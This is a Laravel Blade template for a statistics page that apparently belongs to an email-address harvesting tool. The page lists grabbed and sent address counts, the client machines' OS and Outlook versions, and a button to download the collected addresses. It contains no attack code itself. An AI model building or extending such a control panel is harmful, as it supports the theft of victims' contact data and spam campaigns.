@extends('layouts.app')

@section("content")
    <div>
        <div class="container-fluid">
            <div class="row">
                <div class="col-md-12">
                    <div class="panel panel-default">
                        <div class="panel-body">
                            <h2 class="pull-left">{{ $res['name'] }} statistics</h2>
                            <table class="table table-condensed table-stripped">
                                <tr>
                                    <td class="col-md-2">Started</td>
                                    <td class="col-md-10">{{ $res['started'] }}</td>
                                </tr>
                                <tr>
                                    <td class="col-md-2">Finished</td>
                                    <td class="col-md-10">{{ $res['finished'] }}</td>
                                </tr>

                                <tr>
                                    <td class="col-md-2">Total Clients</td>
                                    <td class="col-md-10">{{ $res['clients'] }}</td>
                                </tr>

                                <tr>
                                    <td class="col-md-2">Total Grabbed Addresses</td>
                                    <td class="col-md-10">{{ $res['total'] }}</td>
                                </tr>

                                <tr>
                                    <td class="col-md-2">Sent Addresses</td>
                                    <td class="col-md-10"><span class="pull-left" style="margin-right: 60px;">{{ $res['sent'] }}</span>
                                        <form action="" method="POST">
                                            {{ csrf_field() }}
                                            <button type="submit" class="btn btn-success btn-sm">Download email addresses</button>
                                        </form>
                                    </td>
                                </tr>
                                <tr>
                                    <td class="col-md-2">Invalid email addresses ignored</td>
                                    <td class="col-md-10">{{ $res['blocked_by_name'] }}</td>
                                </tr>

                                <tr>
                                    <td class="col-md-2">Clients aborted by timeout</td>
                                    <td class="col-md-10">{{ $res['blocked_by_timeout'] }}</td>
                                </tr>

                                <tr>
                                    <td class="col-md-2">OS Version</td>
                                    <td class="col-md-10">
                                        <ul style="padding: 0; list-style: none; margin: 0;">
                                            @foreach($res["sys_ver"] as $item)
                                                <li>{{ $item->vers }}: {{ $item->c }}</li>
                                            @endforeach
                                        </ul>
                                    </td>
                                </tr>

                                <tr>
                                    <td class="col-md-2">Outlook version</td>
                                    <td class="col-md-10">
                                        <ul style="padding: 0; list-style: none; margin: 0;">
                                            @foreach($res["outlook_ver"] as $item)
                                                <li>{{ $item->vers }}: {{ $item->c }}</li>
                                            @endforeach
                                        </ul>
                                    </td>
                                </tr>

                                <tr>
                                    <td class="col-md-2">Outlook bitness</td>
                                    <td class="col-md-10">
                                        <ul style="padding: 0; list-style: none; margin: 0;">
                                            @foreach($res["outlook_platform"] as $item)
                                                <li>{{ $item->vers }}: {{ $item->c }}</li>
                                            @endforeach
                                        </ul>
                                    </td>
                                </tr>

                            </table>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <style>
        .form-group, .table{
            margin-bottom: 0;
        }
        .panel-heading{
            font-weight: bold;
        }

        .control-label{
            white-space:nowrap;
        }

        .panel-footer{
            height: 58px;
        }
    </style>
@endsection